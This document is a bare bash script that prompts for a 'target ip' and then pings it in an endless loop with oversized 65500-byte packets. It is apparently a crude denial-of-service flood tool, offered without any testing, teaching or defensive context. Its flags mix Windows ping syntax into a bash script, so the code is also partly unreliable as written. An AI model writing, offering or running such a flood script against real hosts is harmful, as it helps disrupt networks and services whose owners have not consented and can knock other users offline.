#!/bin/bash
echo "target ip"
read ip
for (( ; ; ))
do
   ping $ip -l 65500 -w 1 -n 1
done
